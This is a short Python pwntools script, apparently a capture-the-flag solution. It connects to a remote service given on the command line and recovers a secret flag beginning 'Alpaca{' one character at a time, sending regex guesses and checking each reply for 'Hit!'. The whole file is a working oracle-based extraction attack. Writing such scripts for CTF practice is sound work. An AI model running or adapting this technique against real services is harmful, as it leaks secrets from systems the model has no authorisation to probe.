import string
from pwn import *
import sys

Str = ""

Str += string.ascii_letters
Str += string.digits
Str += '{'
Str += '_'
Str += '}'

key = "Alpaca{"

while True:
    for i in Str:
        #io = process('./app.py')
        io = remote(sys.argv[1], sys.argv[2])
        io.recvuntil("regex> ")
        attempt = key + i
        io.sendline(attempt.encode())
        #data = io.recvall(timeout=1)
        data = io.recv(256)
        if b"Hit!" in data:
            key += i
            print(key)
            break
        io.close()
    else:
        print(key)
        break

print(key)
